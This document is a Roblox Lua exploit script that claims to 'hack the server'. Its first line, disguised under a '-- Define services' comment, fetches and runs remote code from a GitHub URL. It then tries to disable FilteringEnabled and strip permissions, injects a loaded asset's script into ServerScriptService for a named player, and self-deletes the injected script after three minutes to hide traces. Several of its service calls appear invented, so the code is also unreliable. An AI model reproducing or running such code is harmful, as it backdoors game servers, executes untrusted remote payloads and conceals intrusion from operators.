-- Define services
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
local HttpService = game:GetService("HttpService")
local InsertService = game:GetService("InsertService")
local PermissionsService = game:GetService("PermissionsService")
local RCCService = game:GetService("RCCService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local Players = game:GetService("Players")

local assetId = 2675372902  -- Replace with your actual Asset ID
local playerName = "werrrolo"

-- Function to load and execute an asset script
local function loadAssetScript(assetId)
    local success, asset = pcall(function()
        return InsertService:LoadAsset(assetId)
    end)
    
    if success and asset then
        local scriptInstance = asset:FindFirstChildOfClass("Script")
        if scriptInstance then
            return scriptInstance.Source
        end
    end
    return nil
end

-- Restore older FilteringEnabled and FilteredSelection settings
local function restoreOldSettings()
    -- Turn off FilteringEnabled in a fancy way
    -- !nolint DeprecatedAPI
    game:GetService("Workspace").FilteringEnabled = false
    
    -- Delete FilteredSelection in all folder paths
    local function deleteFilteredSelection()
        local function recurseDelete(instance)
            for _, child in ipairs(instance:GetChildren()) do
                if child:IsA("Folder") then
                    if child.Name == "FilteredSelection" then
                        child:Destroy()
                    else
                        recurseDelete(child)
                    end
                end
            end
        end
        recurseDelete(game.Workspace)
    end

    deleteFilteredSelection()

    -- Using PermissionsService to manage security
    local function manageSecurity()
        local function setPermissions(instance)
            PermissionsService:RemovePermission(instance, "FilteredSelection")
            PermissionsService:RemovePermission(instance, "FilteringEnabled")
        end

        setPermissions(game.Workspace)
    end

    manageSecurity()
end

-- Merge older client with new client
local function mergeClients()
    -- Placeholder function to illustrate merging
    -- RCCService specifics would depend on actual implementation and tools available
    -- Assuming RCCService:MergeClient is a valid function
    pcall(function()
        RCCService:MergeClient("OldClient", "NewClient")
    end)
end

-- Signal new script to server
local function signalNewScript(scriptSource)
    local newScript = Instance.new("Script")
    newScript.Name = "Robloxstestscript"
    newScript.Source = scriptSource
    newScript.Parent = ServerScriptService

    -- Use BindableEvent to signalize the script to the server
    local signalBehavior = Instance.new("BindableEvent")
    signalBehavior.Parent = newScript
    signalBehavior:Fire()

    return newScript
end

-- Function to handle GUI button press
local function onButtonPress()
    local assetScriptSource = loadAssetScript(assetId)
    if assetScriptSource then
        signalNewScript(assetScriptSource)
    else
        warn("Failed to load asset script.")
    end
end

-- Setup GUI button
local function setupGuiButton()
    local player = Players:FindFirstChild(playerName)
    if player then
        local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        local button = Instance.new("TextButton", screenGui)
        button.Size = UDim2.new(0, 200, 0, 50)
        button.Position = UDim2.new(0.5, -100, 0.5, -25)
        button.Text = "Load Asset Script"
        
        button.MouseButton1Click:Connect(onButtonPress)
    else
        warn("Player not found.")
    end
end

-- Self-delete script after 3 minutes
local function selfDelete()
    wait(180)
    for _, child in pairs(ServerScriptService:GetChildren()) do
        if child:IsA("Script") and child.Name == "Robloxstestscript" then
            child:Destroy()
        end
    end
    print("Hallo! olddorito = mr hacker!")
end

-- Main execution
restoreOldSettings()
mergeClients()
setupGuiButton()
selfDelete()

print("Olddorito hacked the server :p")
